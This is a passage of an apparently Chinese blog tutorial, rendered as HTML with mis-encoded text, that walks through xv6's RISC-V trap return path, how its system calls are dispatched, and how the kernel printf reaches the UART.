class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrapret</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å…³é—­è®¾å¤‡ä¸­æ–­</span></span><br><span class="line">  intr_off();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æŠŠ uservec çš„åœ°å€å†™å…¥ stvec å¯„å­˜å™¨</span></span><br><span class="line">  uint64 trampoline_uservec = TRAMPOLINE + (uservec - trampoline);</span><br><span class="line">  w_stvec(trampoline_uservec);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ä¿å­˜å†…æ ¸é¡µè¡¨ã€å†…æ ¸æ ˆã€usertrap åœ°å€ã€CPU æ ¸ id</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_satp = r_satp();         <span class="comment">// kernel page table</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_sp = p-&gt;kstack + PGSIZE; <span class="comment">// process&#x27;s kernel stack</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_trap = (uint64)usertrap;</span><br><span class="line">  p-&gt;trapframe-&gt;kernel_hartid = r_tp();         <span class="comment">// hartid for cpuid()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// set up the registers that trampoline.S&#x27;s sret will use</span></span><br><span class="line">  <span class="comment">// to get to user space.</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// è®¾ç½® sstatus å¯„å­˜å™¨</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> x = r_sstatus();</span><br><span class="line">  x &amp;= ~SSTATUS_SPP; <span class="comment">// SPP ä½æ¸…é›¶ï¼Œä»¥ä¾¿ sret è¿”å›åˆ°ç”¨æˆ·æ¨¡å¼</span></span><br><span class="line">  x |= SSTATUS_SPIE; <span class="comment">// SPIE ä½ç½® 1ï¼Œå…è®¸ç”¨æˆ·æ¨¡å¼ä¸‹è®¾å¤‡ä¸­æ–­</span></span><br><span class="line">  w_sstatus(x);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æŠŠç”¨æˆ·è¿›ç¨‹çš„ pc å†™å…¥ sepc</span></span><br><span class="line">  w_sepc(p-&gt;trapframe-&gt;epc);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å–å‡ºç”¨æˆ·é¡µè¡¨</span></span><br><span class="line">  uint64 satp = MAKE_SATP(p-&gt;pagetable);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å–å‡º userret åœ°å€ï¼Œå‡†å¤‡è°ƒç”¨ï¼Œå¹¶ä¼ é€’ç”¨æˆ·é¡µè¡¨è¿›å»</span></span><br><span class="line">  uint64 trampoline_userret = TRAMPOLINE + (userret - trampoline);</span><br><span class="line">  ((<span class="type">void</span> (*)(uint64))trampoline_userret)(satp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼š</p><ol><li>ä¿å­˜å†…æ ¸é¡µè¡¨ã€å†…æ ¸æ ˆã€CPU æ ¸çš„ id</li><li>é…ç½® sstatus å¯„å­˜å™¨</li><li>è°ƒç”¨ <code>userret</code> å¹¶ä¼ é€’ç”¨æˆ·é¡µè¡¨</li></ol><p><code>usertrapret</code> ä¸»è¦æ˜¯å¤„ç† trap åä¸ºè¿”å›åˆ°ç”¨æˆ·è¿›ç¨‹åšå‡†å¤‡</p><figure class="highlight x86asm"><figcaption><span>kernel/trampoline.S</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">globl userret</span><br><span class="line"><span class="symbol">userret:</span></span><br><span class="line">        # è½¬æ¢åˆ°ç”¨æˆ·é¡µè¡¨</span><br><span class="line">        <span class="keyword">sfence</span><span class="number">.</span>vma <span class="meta">zero</span>, <span class="meta">zero</span></span><br><span class="line">        csrw satp, a0</span><br><span class="line">        <span class="keyword">sfence</span><span class="number">.</span>vma <span class="meta">zero</span>, <span class="meta">zero</span></span><br><span class="line"></span><br><span class="line">        # ä» trapframe ä¸­å–å‡ºç”¨æˆ·è¿›ç¨‹çš„å¯„å­˜å™¨å€¼</span><br><span class="line">        li a0, TRAPFRAME</span><br><span class="line">        ld ra, <span class="number">40</span>(a0)</span><br><span class="line">        ld <span class="built_in">sp</span>, <span class="number">48</span>(a0)</span><br><span class="line">        # æ­¤å¤„çœç•¥...</span><br><span class="line">        ld t6, <span class="number">280</span>(a0)</span><br><span class="line">        ld a0, <span class="number">112</span>(a0)</span><br><span class="line">        </span><br><span class="line">        # è¿”å›åˆ°ç”¨æˆ·æ¨¡å¼å’Œç”¨æˆ·è¿›ç¨‹çš„ pc æ‰€æŒ‡ä½ç½®</span><br><span class="line">        sret</span><br></pre></td></tr></table></figure><p><code>userret</code> ä¸»è¦æ˜¯æ¢å¤ç”¨æˆ·è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œå›åˆ°å‘ç”Ÿ trap çš„ä½ç½®ï¼ˆæˆ–è€…å‘ç”Ÿ trap ä½ç½®åé¢ä¸€ä¸ªæŒ‡ä»¤ï¼Œæ¯”å¦‚ <code>ecall</code> åé¢çš„æŒ‡ä»¤ï¼‰</p><h3 id="çœæµå°ç»“"><a href="#çœæµå°ç»“" class="headerlink" title="çœæµå°ç»“"></a>çœæµå°ç»“</h3><p><del>çœŸçœæµå—ï¼Ÿ</del></p><p>ç”¨æˆ·è¿›ç¨‹ -&gt; <code>uservec</code> -&gt; <code>usertrap</code> -&gt; <code>usertrapret</code> -&gt; <code>userret</code> -&gt; ç”¨æˆ·è¿›ç¨‹</p><ol><li>å‘ç”Ÿ trap æ—¶ï¼Œç¨‹åºä¼šè·³è½¬åˆ° stvec å¯„å­˜å™¨æŒ‡å‘çš„ kernel/trampoline.S ä¸­çš„ <code>uservec</code> ä¿å­˜ç”¨æˆ·è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œå¹¶è®¾ç½®å†…æ ¸æ ˆã€å†…æ ¸çº¿ç¨‹ idã€å†…æ ¸é¡µè¡¨</li><li>ç„¶åè·³è½¬åˆ° kernel/trap.c ä¸­çš„ <code>usertrap</code> å¯¹ trap è¿›è¡Œå¤„ç†</li><li>å¦‚æœè¦æ¢å¤åˆ°ç”¨æˆ·è¿›ç¨‹ï¼Œä¼šè·³è½¬åˆ° kernel/trap.c çš„ <code>usertrapret</code> ä¸ºè¿”å›åˆ°ç”¨æˆ·è¿›ç¨‹åšå‡†å¤‡</li><li>æœ€åè·³è½¬åˆ° kernel/trampoline.S ä¸­çš„ <code>userret</code> æ¢å¤ç”¨æˆ·è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œå›åˆ°å‘ç”Ÿ trap çš„ä½ç½®ï¼ˆæˆ–è€…å‘ç”Ÿ trap ä½ç½®åé¢ä¸€ä¸ªæŒ‡ä»¤ï¼Œæ¯”å¦‚ <code>ecall</code> åé¢çš„æŒ‡ä»¤ï¼‰</li></ol><h2 id="æ€ä¹ˆå®ç°ç³»ç»Ÿè°ƒç”¨"><a href="#æ€ä¹ˆå®ç°ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="æ€ä¹ˆå®ç°ç³»ç»Ÿè°ƒç”¨"></a>æ€ä¹ˆå®ç°ç³»ç»Ÿè°ƒç”¨</h2><p>åœ¨ user/user.h æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„å£°æ˜</p><figure class="highlight c"><figcaption><span>user/user.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span>)</span> __<span class="title function_">attribute__</span><span class="params">((<span class="keyword">noreturn</span>))</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">wait</span><span class="params">(<span class="type">int</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe</span><span class="params">(<span class="type">int</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span>, <span class="type">const</span> <span class="type">void</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span>, <span class="type">void</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆï¼Œå°±æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œç³»ç»Ÿè°ƒç”¨æ˜æ˜æ˜¯è¦ç”¨ <code>ecall</code> æ¥ä½¿ç”¨ï¼Œxv6 æ˜¯æ€ä¹ˆæŠŠç³»ç»Ÿè°ƒç”¨åšæˆä¸€ä¸ªå‡½æ•°ï¼Œä½¿å¾—ç”¨æˆ·ç¨‹åºåƒè°ƒç”¨å‡½æ•°é‚£æ ·è°ƒç”¨ç³»ç»Ÿè°ƒç”¨ï¼Ÿ</p><h3 id="æ€ä¹ˆåˆ¶ä½œç”¨æˆ·ç³»ç»Ÿè°ƒç”¨å‡½æ•°"><a href="#æ€ä¹ˆåˆ¶ä½œç”¨æˆ·ç³»ç»Ÿè°ƒç”¨å‡½æ•°" class="headerlink" title="æ€ä¹ˆåˆ¶ä½œç”¨æˆ·ç³»ç»Ÿè°ƒç”¨å‡½æ•°"></a>æ€ä¹ˆåˆ¶ä½œç”¨æˆ·ç³»ç»Ÿè°ƒç”¨å‡½æ•°</h3><p>æˆ‘ä»¬å¯ä»¥åœ¨ user/usys.S çœ‹åˆ°ç³»ç»Ÿè°ƒç”¨å‡½æ•°åœ¨æ±‡ç¼–ä¸­çš„å®šä¹‰</p><figure class="highlight x86asm"><figcaption><span>user/usys.S</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include <span class="string">&quot;kernel/syscall.h&quot;</span></span><br><span class="line"><span class="meta">.global</span> fork</span><br><span class="line"><span class="symbol">fork:</span></span><br><span class="line"> li a7, SYS_fork</span><br><span class="line"> ecall</span><br><span class="line"> <span class="keyword">ret</span></span><br><span class="line"><span class="meta">.global</span> exit</span><br><span class="line"><span class="symbol">exit:</span></span><br><span class="line"> li a7, SYS_exit</span><br><span class="line"> ecall</span><br><span class="line"> <span class="keyword">ret</span></span><br><span class="line"><span class="meta">.global</span> wait</span><br><span class="line"><span class="symbol">wait:</span></span><br><span class="line"> li a7, SYS_wait</span><br><span class="line"> ecall</span><br><span class="line"> <span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>å¯ä»¥è§‚å¯Ÿåˆ°ï¼Œæ¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨å‡½æ•°éƒ½åªæ˜¯å°†ç³»ç»Ÿè°ƒç”¨å·ä¼ é€’ç»™ a7ï¼Œç„¶åä½¿ç”¨ <code>ecall</code> è°ƒç”¨ç³»ç»Ÿè°ƒç”¨ï¼Œæœ€åè¿”å›åˆ°ä¸Šä¸€å±‚å‡½æ•°</p><p>è€Œå‚æ•°ä¼ é€’æ˜¯ç”¨æˆ·ç¨‹åºåœ¨è°ƒç”¨ç³»ç»Ÿè°ƒç”¨å‡½æ•°ä¹‹å‰ï¼Œä¼šæ ¹æ®å‡½æ•°å£°æ˜å°†å‚æ•°ä¼ é€’ç»™å¯¹åº”çš„å¯„å­˜å™¨ï¼Œç„¶åè·³è½¬åˆ°ç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„åœ°å€æ‰§è¡Œ</p><p>è¿™ä¸ª user/usys.S æ–‡ä»¶å…¶å®æ˜¯ä¸€ä¸ª perl è„šæœ¬ user/usys.pl ç”Ÿæˆçš„ï¼Œä¾¿äºæ·»åŠ ç³»ç»Ÿè°ƒç”¨</p><p>å¥½çš„ï¼Œä¸Šé¢è§£é‡Šäº†ç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„å®ç°ï¼Œä¸‹é¢å°±çœ‹çœ‹ <code>ecall</code> åˆ°åº•åšäº†ä»€ä¹ˆæ¥è¯·æ±‚å†…æ ¸å®Œæˆç³»ç»Ÿè°ƒç”¨</p><h3 id="æ€ä¹ˆè¯·æ±‚å†…æ ¸å®Œæˆç³»ç»Ÿè°ƒç”¨"><a href="#æ€ä¹ˆè¯·æ±‚å†…æ ¸å®Œæˆç³»ç»Ÿè°ƒç”¨" class="headerlink" title="æ€ä¹ˆè¯·æ±‚å†…æ ¸å®Œæˆç³»ç»Ÿè°ƒç”¨"></a>æ€ä¹ˆè¯·æ±‚å†…æ ¸å®Œæˆç³»ç»Ÿè°ƒç”¨</h3><p><code>ecall</code> æ˜¯ç”±ç”¨æˆ·è¿›ç¨‹ä¸»åŠ¨é™·å…¥ trap è¯·æ±‚å†…æ ¸å®Œæˆç³»ç»Ÿè°ƒç”¨çš„æ±‡ç¼–æŒ‡ä»¤</p><p>å®ƒä¼šä½¿ scause å¯„å­˜å™¨å€¼è®¾ä¸º 8ï¼Œåœ¨ RISC-V ä¸­å®ƒä»£è¡¨ç€ç³»ç»Ÿè°ƒç”¨</p><p>åœ¨åˆ‡æ¢åˆ°å†…æ ¸æ€åï¼Œè·³è½¬åˆ° kernel/trap.c çš„ <code>usertrap</code></p><p>æˆ‘ä»¬ä»”ç»†çœ‹çœ‹ kernel/trap.c çš„ <code>usertrap</code> æ€ä¹ˆå¤„ç†ç³»ç»Ÿè°ƒç”¨çš„</p><figure class="highlight c"><figcaption><span>kernel/trap.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// å½“æ£€æŸ¥åˆ° trap åŸå› æ˜¯ç³»ç»Ÿè°ƒç”¨æ—¶</span></span><br><span class="line">  <span class="keyword">if</span>(r_scause() == <span class="number">8</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å…ˆæ£€æŸ¥ç”¨æˆ·è¿›ç¨‹æ˜¯å¦è¢«æ€æ­»</span></span><br><span class="line">    <span class="keyword">if</span>(killed(p))</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŠŠ epc åŠ  4ï¼Œå› ä¸ºæˆ‘ä»¬ä¸æƒ³è¿”å›åˆ°ç”¨æˆ·è¿›ç¨‹æ—¶å†å»æ‰§è¡Œä¸€æ¬¡ ecall</span></span><br><span class="line">    p-&gt;trapframe-&gt;epc += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯ç”¨è®¾å¤‡ä¸­æ–­</span></span><br><span class="line">    intr_on();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¼€å§‹å¤„ç†ç³»ç»Ÿè°ƒç”¨</span></span><br><span class="line">    syscall();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>usertrap</code> æ£€æŸ¥åˆ°æ˜¯ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå°† epc çš„å€¼åŠ  4ï¼Œä»¥ä¾¿è¿”å›æ—¶æ‰§è¡Œ <code>ecall</code> åé¢çš„æŒ‡ä»¤ï¼Œç„¶åè·³è½¬åˆ°å¤„ç†ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•° <code>syscall</code></p><figure class="highlight c"><figcaption><span>kernel/syscall.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¤„ç†ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°çš„åŸå‹</span></span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_exit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_mkdir</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_close</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="type">void</span>)</span> = &#123;</span><br><span class="line">[SYS_fork]    sys_fork,</span><br><span class="line">[SYS_exit]    sys_exit,</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">[SYS_mkdir]   sys_mkdir,</span><br><span class="line">[SYS_close]   sys_close,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">syscall</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å–å‡ºç³»ç»Ÿè°ƒç”¨å·ï¼Œæ£€æŸ¥å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™æ‰“å°é”™è¯¯</span></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    <span class="comment">// å­˜åœ¨åˆ™æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å¤„ç†å‡½æ•°ï¼Œå¹¶æŠŠè¿”å›å€¼å­˜åˆ° a0 ä¸­ï¼Œåé¢ä¼šä¼ é€’ç»™ç”¨æˆ·è¿›ç¨‹</span></span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">            p-&gt;pid, p-&gt;name, num);</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>syscall</code> ä¼šæ ¹æ®ç”¨æˆ·è¿›ç¨‹æŒ‡å®šçš„ç³»ç»Ÿè°ƒç”¨å·æ‰§è¡ŒæŒ‡å®šçš„ç³»ç»Ÿè°ƒç”¨å¤„ç†å‡½æ•°</p><p>æœ€åä¼šç»è¿‡ <code>usertrapret</code>ã€<code>userret</code> è¿”å›åˆ°ç”¨æˆ·è¿›ç¨‹</p><h3 id="çœæµå°ç»“-1"><a href="#çœæµå°ç»“-1" class="headerlink" title="çœæµå°ç»“"></a>çœæµå°ç»“</h3><p>ecall -&gt; <code>uservec</code> -&gt; <code>usertrap</code> -&gt; <code>syscall</code> -&gt; <code>usertrapret</code> -&gt; <code>userret</code> -&gt; ecall + 4</p><p>å…³é”®åœ¨äº <code>syscall</code> æ ¹æ®ç³»ç»Ÿè°ƒç”¨å·è°ƒç”¨å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å¤„ç†å‡½æ•°</p><h2 id="æ€ä¹ˆå®ç°å¯å˜å‚æ•°-printf-å¹¶è¾“å‡º"><a href="#æ€ä¹ˆå®ç°å¯å˜å‚æ•°-printf-å¹¶è¾“å‡º" class="headerlink" title="æ€ä¹ˆå®ç°å¯å˜å‚æ•° printf å¹¶è¾“å‡º"></a>æ€ä¹ˆå®ç°å¯å˜å‚æ•° printf å¹¶è¾“å‡º</h2><p>è¿™é‡Œä»‹ç»å†…æ ¸çš„ <code>printf</code>ï¼ˆkernel/printf.cï¼‰</p><h3 id="å¯å˜å‚æ•°"><a href="#å¯å˜å‚æ•°" class="headerlink" title="å¯å˜å‚æ•°"></a>å¯å˜å‚æ•°</h3><p>å…¶å®å¯å˜å‚æ•°æ˜¯ç”± C è¯­è¨€åº“å’Œç¼–è¯‘å™¨æ¥å®ç°çš„</p><p>C è¯­è¨€åº“ä¸­ç»™å‡ºäº† <code>va_start</code>ã€<code>va_arg</code>ã€<code>va_end</code> æ¥å£ï¼Œè¿™é‡Œåªç®€å•ä»‹ç»ä¸€ä¸‹ï¼Œæƒ³è¯¦ç»†äº†è§£å¯å‚è€ƒæœ«å°¾çš„é“¾æ¥ï¼Œä¸è¿‡æ˜¯ x86_64 æ¶æ„ï¼ŒåŸç†ç±»ä¼¼</p><ul><li><code>va_list</code>ï¼šä¸€ä¸ªå˜é‡ç±»å‹ï¼Œvariable arguments list å¯å˜å‚æ•°åˆ—è¡¨</li><li><code>va_start(v, l)</code>ï¼šåˆå§‹åŒ–å¯å˜å‚æ•°åˆ—è¡¨ï¼Œl ä¸ºå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å</li><li><code>va_arg(v, type)</code>ï¼šä»å¯å˜å‚æ•°åˆ—è¡¨ä¸­å–å‡ºä¸€ä¸ªå‚æ•°ï¼Œé¡»æŒ‡å®šå‚æ•°ç±»å‹</li><li><code>va_end(v)</code>ï¼šç»“æŸæ—¶é‡Šæ”¾ va_list å†…å­˜</li></ul><p>æˆ‘ä»¬çŸ¥é“ RISC-V å‰ 8 ä¸ªå‚æ•°æ˜¯æ”¾åœ¨ a0-7 å¯„å­˜å™¨ä¸­ï¼Œå®ƒæ˜¯æ€ä¹ˆåˆä»å¯„å­˜å™¨ä¸­å–å€¼åˆä»æ ˆä¸­å–å€¼çš„</p><p>ç­”æ¡ˆæ˜¯ç¼–è¯‘å™¨ä¼šå°†é™¤ a0 ä»¥å¤–çš„å¯„å­˜å™¨å…¨éƒ¨å‹åˆ°æ ˆä¸­ï¼Œè¿™æ ·æ‰€æœ‰å‚æ•°éƒ½æ˜¯è¿ç»­å­˜å‚¨åœ¨æ ˆä¸­ï¼Œä¾¿äºå–å€¼ï¼Œä½†æ˜¯ä¸è¦è‡ªå·±å»å–åœ°å€ç„¶åè¾“å‡ºï¼ˆç¬‘ï¼‰ï¼Œè¦ç”¨ C è¯­è¨€åº“çš„æ¥å£</p><h3 id="è¾“å‡ºåˆ°ç¡¬ä»¶"><a href="#è¾“å‡ºåˆ°ç¡¬ä»¶" class="headerlink" title="è¾“å‡ºåˆ°ç¡¬ä»¶"></a>è¾“å‡ºåˆ°ç¡¬ä»¶</h3><p>æ¯æ¬¡è¾“å‡ºæ—¶å°†ä¸€ä¸ªå­—ç¬¦ä¼ ç»™ç¡¬ä»¶ï¼Œç¡¬ä»¶å›æ˜¾ç»™æ§åˆ¶å°</p><p>å†…æ ¸ä¸­æœ‰ <code>consputc</code> å°±æ˜¯å°†å­—ç¬¦ä¼ ç»™ç¡¬ä»¶çš„å‡½æ•°ï¼Œåœ¨ kernel/console.c ä¸­</p><figure class="highlight c"><figcaption><span>kernel/console.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">consputc</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(c == BACKSPACE)&#123;</span><br><span class="line">    <span class="comment">// å¦‚æœæ˜¯é€€æ ¼ï¼Œé‚£ä¹ˆå°±è¾“å‡ºå…ˆé€€æ ¼ï¼Œè¾“å‡ºä¸€ä¸ªç©ºæ ¼ï¼Œå†é€€æ ¼</span></span><br><span class="line">    uartputc_sync(<span class="string">&#x27;\b&#x27;</span>); uartputc_sync(<span class="string">&#x27; &#x27;</span>); uartputc_sync(<span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// å¦åˆ™ç›´æ¥è¾“å‡º</span></span><br><span class="line">    uartputc_sync(c);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼ é€’ç»™ç¡¬ä»¶å¯„å­˜å™¨å…·ä½“åœ¨ kernel/uart.c çš„ <code>uartputc_sync</code> å‡½æ•°ä¸­</p><figure class="highlight c"><figcaption><span>kernel/uart.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">uartputc_sync</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// å…³é—­ç¡¬ä»¶ä¸­æ–­</span></span><br><span class="line">  push_off();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(panicked)&#123;</span><br><span class="line">    <span class="keyword">for</span>(;;)</span><br><span class="line">      ;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç­‰å¾…ä¹‹å‰çš„å­—ç¬¦ä¼ è¾“å®Œæˆï¼Œç¡¬ä»¶å‡†å¤‡æ¥æ”¶å­—ç¬¦</span></span><br><span class="line">  <span class="keyword">while</span>((ReadReg(LSR) &amp; LSR_TX_IDLE) == <span class="number">0</span>)</span><br><span class="line">    ;</span><br><span class="line">  <span class="comment">// æŠŠå­—ç¬¦å†™å…¥ç¡¬ä»¶ç”¨äºæ¥æ”¶å­—ç¬¦çš„å¯„å­˜å™¨ä¸­</span></span><br><span class="line">  WriteReg(THR, c);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¼€å¯ç¡¬ä»¶ä¸­æ–­</span></span><br><span class="line">  pop_off();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><p>æ¥ä¸‹æ¥çœ‹çœ‹ <code>printf</code> ä»£ç å®ç°</p><figure class="highlight c"><figcaption><span>kernel/printf.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 